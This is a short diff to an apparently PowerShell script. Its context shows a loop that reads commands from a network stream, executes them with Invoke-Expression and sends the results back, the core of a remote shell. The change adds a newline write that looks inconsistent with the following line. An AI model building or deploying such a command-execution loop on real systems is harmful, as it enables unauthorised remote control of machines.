@@ -34,6 +34,7 @@ while( $true ) {
     if( $Stream.DataAvailable ){
         $command = $StreamReader.ReadLine()
         $response = ( Invoke-Expression $command )
+        Write-Stream "`n"
         Write-Stream -stream $Stream -what $response
     }
     Start-Sleep -Seconds 1
